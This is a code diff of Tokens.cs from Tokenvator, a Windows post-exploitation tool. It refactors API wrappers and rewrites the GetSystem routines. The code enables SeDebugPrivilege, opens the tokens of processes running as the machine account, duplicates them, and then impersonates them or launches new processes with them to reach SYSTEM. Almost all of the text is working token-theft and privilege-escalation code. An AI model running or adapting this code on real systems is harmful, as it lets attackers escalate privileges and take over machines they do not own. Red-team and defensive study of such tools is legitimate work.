@@ -10,14 +10,16 @@ using System.Text;
 
 namespace Tokenvator
 {
-    class Tokens
+    class Tokens : IDisposable
     {
         protected IntPtr phNewToken;
         protected IntPtr hExistingToken;
         private IntPtr currentProcessToken;
         private Dictionary<UInt32, String> processes;
 
-        List<String> validPrivileges = new List<string> { "SeAssignPrimaryTokenPrivilege", 
+        private delegate Boolean Create(IntPtr phNewToken, String newProcess, String arguments); 
+
+        private static List<String> validPrivileges = new List<string> { "SeAssignPrimaryTokenPrivilege", 
             "SeAuditPrivilege", "SeBackupPrivilege", "SeChangeNotifyPrivilege", "SeCreateGlobalPrivilege", 
             "SeCreatePagefilePrivilege", "SeCreatePermanentPrivilege", "SeCreateSymbolicLinkPrivilege", 
             "SeCreateTokenPrivilege", "SeDebugPrivilege", "SeEnableDelegationPrivilege", 
@@ -45,8 +47,14 @@ namespace Tokenvator
             }
 
             currentProcessToken = new IntPtr();
-            Unmanaged.OpenProcessToken(Process.GetCurrentProcess().Handle, Constants.TOKEN_ALL_ACCESS, out currentProcessToken);
+            kernel32.OpenProcessToken(Process.GetCurrentProcess().Handle, Constants.TOKEN_ALL_ACCESS, out currentProcessToken);
             SetTokenPrivilege(ref currentProcessToken, Constants.SE_DEBUG_NAME);
+        }
+
+        public void Dispose()
+        {
+            kernel32.CloseHandle(phNewToken);
+            kernel32.CloseHandle(hExistingToken);
         }
 
         ////////////////////////////////////////////////////////////////////////////////
@@ -54,8 +62,7 @@ namespace Tokenvator
         ////////////////////////////////////////////////////////////////////////////////
         ~Tokens()
         {
-            Unmanaged.CloseHandle(phNewToken);
-            Unmanaged.CloseHandle(hExistingToken);
+            Dispose();
         }
 
         ////////////////////////////////////////////////////////////////////////////////
@@ -68,7 +75,7 @@ namespace Tokenvator
             {
                 return false;
             }
-            if (!Unmanaged.DuplicateTokenEx(
+            if (!advapi32.DuplicateTokenEx(
                         hExistingToken,
                         (UInt32)Enums.ACCESS_MASK.MAXIMUM_ALLOWED,
                         IntPtr.Zero,
@@ -81,7 +88,18 @@ namespace Tokenvator
                 return false;
             }
             Console.WriteLine(" [+] Duplicate Token Handle: " + phNewToken.ToInt32());
-            if (!CreateProcessWithTokenW(phNewToken, newProcess, ""))
+
+            Create createProcess;
+            if (0 == Process.GetCurrentProcess().SessionId)
+            {
+                createProcess = CreateProcess.CreateProcessWithLogonW;
+            }
+            else
+            {
+                createProcess = CreateProcess.CreateProcessWithTokenW;
+            }
+
+            if (!createProcess(phNewToken, newProcess, ""))
             {
                 return false;
             }
@@ -99,7 +117,7 @@ namespace Tokenvator
             {
                 return false;
             }
-            if (!Unmanaged.DuplicateTokenEx(
+            if (!advapi32.DuplicateTokenEx(
                         hExistingToken,
                         (UInt32)Enums.ACCESS_MASK.MAXIMUM_ALLOWED,
                         IntPtr.Zero,
@@ -112,7 +130,7 @@ namespace Tokenvator
                 return false;
             }
             Console.WriteLine(" [+] Duplicate Token Handle: {0}", phNewToken.ToInt32());
-            if (!Unmanaged.ImpersonateLoggedOnUser(phNewToken))
+            if (!advapi32.ImpersonateLoggedOnUser(phNewToken))
             {
                 GetError("ImpersonateLoggedOnUser: ");
                 return false;
@@ -125,10 +143,17 @@ namespace Tokenvator
         ////////////////////////////////////////////////////////////////////////////////
         public Boolean GetSystem(String newProcess)
         {
-            SecurityIdentifier systemSID = new SecurityIdentifier(WellKnownSidType.LocalSystemSid, null);
-            String LocalSystemNTAccount = systemSID.Translate(typeof(NTAccount)).Value.ToString();
-            EnumerateTokens(LocalSystemNTAccount);
+            //SecurityIdentifier systemSID = new SecurityIdentifier(WellKnownSidType.LocalSystemSid, null);
 
+            IntPtr domain;
+            netapi32.NetJoinStatus joinStatus;
+            netapi32.NetGetJoinInformation(null, out domain, out joinStatus);
+            String domainName = Marshal.PtrToStringUni(domain);
+            String LocalSystemNTAccount = String.Format("{0}\\{1}$", domainName, Environment.MachineName);
+
+            Console.WriteLine("[*] Searching for {0}", LocalSystemNTAccount);
+            processes = Enumeration.EnumerateUserProcesses(false, LocalSystemNTAccount);
+            
             foreach (UInt32 process in processes.Keys)
             {
                 if (StartProcessAsUser((Int32)process, newProcess))
@@ -144,10 +169,15 @@ namespace Tokenvator
         ////////////////////////////////////////////////////////////////////////////////
         public Boolean GetSystem()
         {
-            SecurityIdentifier systemSID = new SecurityIdentifier(WellKnownSidType.LocalSystemSid, null);
-            String LocalSystemNTAccount = systemSID.Translate(typeof(NTAccount)).Value.ToString();
-            EnumerateTokens(LocalSystemNTAccount);
+            IntPtr domain;
+            netapi32.NetJoinStatus joinStatus;
+            netapi32.NetGetJoinInformation(null, out domain, out joinStatus);
+            String domainName = Marshal.PtrToStringUni(domain);
+            String LocalSystemNTAccount = String.Format("{0}\\{1}$", domainName, Environment.MachineName);
 
+            Console.WriteLine("[*] Searching for {0}", LocalSystemNTAccount);
+            processes = Enumeration.EnumerateUserProcesses(false, LocalSystemNTAccount);
+            
             foreach (UInt32 process in processes.Keys)
             {
                 if (ImpersonateUser((Int32)process))
@@ -209,114 +239,12 @@ namespace Tokenvator
         }
 
         ////////////////////////////////////////////////////////////////////////////////
-        // Wrapper for ProcessWithLogonW
-        ////////////////////////////////////////////////////////////////////////////////
-        protected static Boolean CreateProcessWithLogonW(IntPtr phNewToken, String name, String arguments)
-        {
-            Console.WriteLine("[*] CreateProcessWithLogonW");
-            IntPtr lpProcessName = Marshal.StringToHGlobalUni(name);
-            IntPtr lpProcessArgs = Marshal.StringToHGlobalUni(name);
-            Structs._STARTUPINFO startupInfo = new Structs._STARTUPINFO();
-            startupInfo.cb = (UInt32)Marshal.SizeOf(typeof(Structs._STARTUPINFO));
-            Structs._PROCESS_INFORMATION processInformation = new Structs._PROCESS_INFORMATION();
-            if (!Unmanaged.CreateProcessWithLogonW(
-                "i",
-                "j",
-                "k",
-                0x00000002,
-                name,
-                arguments,
-                0x04000000,
-                IntPtr.Zero,
-                "C:\\Windows\\System32",
-                ref startupInfo,
-                out processInformation
-            ))
-            {
-                GetError("CreateProcessWithLogonW: ");
-                return false;
-            }
-            Console.WriteLine(" [+] Created process: " + processInformation.dwProcessId);
-            Console.WriteLine(" [+] Created thread: " + processInformation.dwThreadId);
-            return true;
-        }
-
-        ////////////////////////////////////////////////////////////////////////////////
-        // Wrapper for CreateProcessWithTokenW
-        ////////////////////////////////////////////////////////////////////////////////
-        protected static Boolean CreateProcessWithTokenW(IntPtr phNewToken, String name, String arguments)
-        {
-            Console.WriteLine("[*] CreateProcessWithTokenW");
-            IntPtr lpProcessName = Marshal.StringToHGlobalUni(name);
-            IntPtr lpProcessArgs = Marshal.StringToHGlobalUni(name);
-            Structs._STARTUPINFO startupInfo = new Structs._STARTUPINFO();
-            startupInfo.cb = (UInt32)Marshal.SizeOf(typeof(Structs._STARTUPINFO));
-            Structs._PROCESS_INFORMATION processInformation = new Structs._PROCESS_INFORMATION();
-            if (!Unmanaged.CreateProcessWithTokenW(
-                phNewToken,
-                Enums.LOGON_FLAGS.NetCredentialsOnly,
-                lpProcessName,
-                lpProcessArgs,
-                Enums.CREATION_FLAGS.NONE,
-                IntPtr.Zero,
-                IntPtr.Zero,
-                ref startupInfo,
-                out processInformation
-            ))
-            {
-                GetError("CreateProcessWithTokenW: ");
-                return false;
-            }
-            Console.WriteLine(" [+] Created process: " + processInformation.dwProcessId);
-            Console.WriteLine(" [+] Created thread: " + processInformation.dwThreadId);
-            return true;
-        }
-
-        ////////////////////////////////////////////////////////////////////////////////
-        // Lists tokens
-        ////////////////////////////////////////////////////////////////////////////////
-        public void EnumerateTokens(String userAccount)
-        {
-            Int32 size = 0;
-            List<ManagementObject> systemProcesses = new List<ManagementObject>();
-            ManagementScope scope = new ManagementScope("\\\\.\\root\\cimv2");
-            scope.Connect();
-            if (!scope.IsConnected)
-            {
-                Console.WriteLine("[-] Failed to connect to WMI");
-            }
-
-            ObjectQuery query = new ObjectQuery("SELECT * FROM Win32_Process");
-            ManagementObjectSearcher objectSearcher = new ManagementObjectSearcher(scope, query);
-            ManagementObjectCollection objectCollection = objectSearcher.Get();
-            Console.WriteLine("[*] Examining " + objectCollection.Count + " processes");
-            foreach (ManagementObject managementObject in objectCollection)
-            {
-                try
-                {
-                    String[] owner = new String[2];
-                    managementObject.InvokeMethod("GetOwner", (object[])owner);
-                    if ((owner[1] + "\\" + owner[0]).ToUpper() == userAccount.ToUpper())
-                    {
-                        processes.Add((UInt32)managementObject["ProcessId"], (String)managementObject["Name"]);
-                        size++;
-                    }
-                }
-                catch (ManagementException error)
-                {
-                    Console.WriteLine("[-] " + error);
-                }
-            }
-            Console.WriteLine("[*] Discovered " + size + " processes");
-        }
-
-        ////////////////////////////////////////////////////////////////////////////////
         // Sets hToken to a processes primary token
         ////////////////////////////////////////////////////////////////////////////////
         public virtual Boolean GetPrimaryToken(UInt32 processId, String name)
         {
             //Originally Set to true
-            IntPtr hProcess = Unmanaged.OpenProcess(Constants.PROCESS_QUERY_INFORMATION, true, processId);
+            IntPtr hProcess = kernel32.OpenProcess(Constants.PROCESS_QUERY_INFORMATION, true, processId);
             if (hProcess == IntPtr.Zero)
             {
                 return false;
@@ -324,12 +252,12 @@ namespace Tokenvator
             Console.WriteLine("[+] Recieved Handle for: " + name + " (" + processId + ")");
             Console.WriteLine(" [+] Process Handle: " + hProcess.ToInt32());
 
-            if (!Unmanaged.OpenProcessToken(hProcess, Constants.TOKEN_ALT, out hExistingToken))
+            if (!kernel32.OpenProcessToken(hProcess, Constants.TOKEN_ALT, out hExistingToken))
             {
                 return false;   
             }
             Console.WriteLine(" [+] Primary Token Handle: " + hExistingToken.ToInt32());
-            Unmanaged.CloseHandle(hProcess);
+            kernel32.CloseHandle(hProcess);
             return true;
         }
 
@@ -340,18 +268,18 @@ namespace Tokenvator
         {
             IntPtr hToken = new IntPtr();
             Console.WriteLine("[*] Opening Thread Token");
-            if (!Unmanaged.OpenThreadToken(Unmanaged.GetCurrentThread(), (Constants.TOKEN_QUERY | Constants.TOKEN_ADJUST_PRIVILEGES), false, ref hToken))
+            if (!kernel32.OpenThreadToken(kernel32.GetCurrentThread(), (Constants.TOKEN_QUERY | Constants.TOKEN_ADJUST_PRIVILEGES), false, ref hToken))
             {
                 Console.WriteLine(" [-] OpenTheadToken Failed");
                 Console.WriteLine(" [*] Impersonating Self");
-                if (!Unmanaged.ImpersonateSelf(Enums.SECURITY_IMPERSONATION_LEVEL.SecurityImpersonation))
+                if (!advapi32.ImpersonateSelf(Enums.SECURITY_IMPERSONATION_LEVEL.SecurityImpersonation))
                 {
                     GetError("ImpersonateSelf");
                     return IntPtr.Zero;
                 }
                 Console.WriteLine(" [+] Impersonated Self");
                 Console.WriteLine(" [*] Retrying");
-                if (!Unmanaged.OpenThreadToken(Unmanaged.GetCurrentThread(), (Constants.TOKEN_QUERY | Constants.TOKEN_ADJUST_PRIVILEGES), false, ref hToken))
+                if (!kernel32.OpenThreadToken(kernel32.GetCurrentThread(), (Constants.TOKEN_QUERY | Constants.TOKEN_ADJUST_PRIVILEGES), false, ref hToken))
                 {
                     GetError("OpenThreadToken");
                     return IntPtr.Zero;
@@ -371,7 +299,7 @@ namespace Tokenvator
             Console.WriteLine("[*] Adjusting Token Privilege");
             ////////////////////////////////////////////////////////////////////////////////
             Structs._LUID luid = new Structs._LUID();
-            if (!Unmanaged.LookupPrivilegeValue(null, privilege, ref luid))
+            if (!advapi32.LookupPrivilegeValue(null, privilege, ref luid))
             {
                 GetError("LookupPrivilegeValue");
                 return;
@@ -390,7 +318,7 @@ namespace Tokenvator
             Structs._TOKEN_PRIVILEGES previousState = new Structs._TOKEN_PRIVILEGES();
             UInt32 returnLength = 0;
             Console.WriteLine(" [+] AdjustTokenPrivilege Pass 1");
-            if (!Unmanaged.AdjustTokenPrivileges(hToken, false, ref newState, (UInt32)Marshal.SizeOf(newState), ref previousState, out returnLength))
+            if (!advapi32.AdjustTokenPrivileges(hToken, false, ref newState, (UInt32)Marshal.SizeOf(newState), ref previousState, out returnLength))
             {
                 GetError("AdjustTokenPrivileges - 1");
                 return;
@@ -410,7 +338,7 @@ namespace Tokenvator
             ////////////////////////////////////////////////////////////////////////////////
             Structs._TOKEN_PRIVILEGES kluge = new Structs._TOKEN_PRIVILEGES();
             Console.WriteLine(" [+] AdjustTokenPrivilege Pass 2");
-            if (!Unmanaged.AdjustTokenPrivileges(hToken, false, ref previousState, (UInt32)Marshal.SizeOf(previousState), ref kluge, out returnLength))
+            if (!advapi32.AdjustTokenPrivileges(hToken, false, ref previousState, (UInt32)Marshal.SizeOf(previousState), ref kluge, out returnLength))
             {
                 GetError("AdjustTokenPrivileges - 2");
                 return;
@@ -427,10 +355,15 @@ namespace Tokenvator
         ////////////////////////////////////////////////////////////////////////////////
         public static void SetTokenPrivilege(ref IntPtr hToken, String privilege)
         {
+            if (!validPrivileges.Contains(privilege))
+            {
+                Console.WriteLine("[-] Invalid Privilege Specified");
+                return;
+            }
             Console.WriteLine("[*] Adjusting Token Privilege");
             ////////////////////////////////////////////////////////////////////////////////
             Structs._LUID luid = new Structs._LUID();
-            if (!Unmanaged.LookupPrivilegeValue(null, privilege, ref luid))
+            if (!advapi32.LookupPrivilegeValue(null, privilege, ref luid))
             {
                 GetError("LookupPrivilegeValue");
                 return;
@@ -449,7 +382,7 @@ namespace Tokenvator
             Structs._TOKEN_PRIVILEGES previousState = new Structs._TOKEN_PRIVILEGES();
             UInt32 returnLength = 0;
             Console.WriteLine(" [*] AdjustTokenPrivilege");
-            if (!Unmanaged.AdjustTokenPrivileges(hToken, false, ref newState, (UInt32)Marshal.SizeOf(newState), ref previousState, out returnLength))
+            if (!advapi32.AdjustTokenPrivileges(hToken, false, ref newState, (UInt32)Marshal.SizeOf(newState), ref previousState, out returnLength))
             {
                 GetError("AdjustTokenPrivileges");
                 return;
@@ -467,7 +400,7 @@ namespace Tokenvator
             ////////////////////////////////////////////////////////////////////////////////
             UInt32 TokenInfLength = 0;
             Console.WriteLine("[*] Enumerating Token Privileges");
-            Unmanaged.GetTokenInformation(
+            advapi32.GetTokenInformation(
                 hToken, 
                 Enums._TOKEN_INFORMATION_CLASS.TokenPrivileges, 
                 IntPtr.Zero, 
@@ -484,7 +417,7 @@ namespace Tokenvator
             IntPtr lpTokenInformation = Marshal.AllocHGlobal((Int32)TokenInfLength) ;
             
             ////////////////////////////////////////////////////////////////////////////////
-            if (!Unmanaged.GetTokenInformation(
+            if (!advapi32.GetTokenInformation(
                 hToken, 
                 Enums._TOKEN_INFORMATION_CLASS.TokenPrivileges, 
                 lpTokenInformation, 
@@ -508,8 +441,8 @@ namespace Tokenvator
                 Int32 cchName = 0;
                 IntPtr lpLuid = Marshal.AllocHGlobal(Marshal.SizeOf(tokenPrivileges.Privileges[i]));
                 Marshal.StructureToPtr(tokenPrivileges.Privileges[i].Luid, lpLuid, true);
-                
-                Unmanaged.LookupPrivilegeName(null, lpLuid, null, ref cchName);
+
+                advapi32.LookupPrivilegeName(null, lpLuid, null, ref cchName);
                 if (cchName < 0 || cchName > Int32.MaxValue)  
                 {
                     GetError("LookupPrivilegeName " + cchName);
@@ -517,7 +450,7 @@ namespace Tokenvator
                 }
 
                 lpName.EnsureCapacity(cchName + 1);
-                if (!Unmanaged.LookupPrivilegeName(null, lpLuid, lpName, ref cchName))
+                if (!advapi32.LookupPrivilegeName(null, lpLuid, lpName, ref cchName))
                 {
                     Console.WriteLine("[-] Privilege Name Lookup Failed");
                     continue;
@@ -529,7 +462,7 @@ namespace Tokenvator
                 privilegeSet.Privilege = new Structs._LUID_AND_ATTRIBUTES[] { tokenPrivileges.Privileges[i] };
 
                 IntPtr pfResult;
-                if (!Unmanaged.PrivilegeCheck(hToken, privilegeSet, out pfResult))
+                if (!advapi32.PrivilegeCheck(hToken, privilegeSet, out pfResult))
                 {
                     Console.WriteLine("[-] Privilege Check Failed");
                     continue;
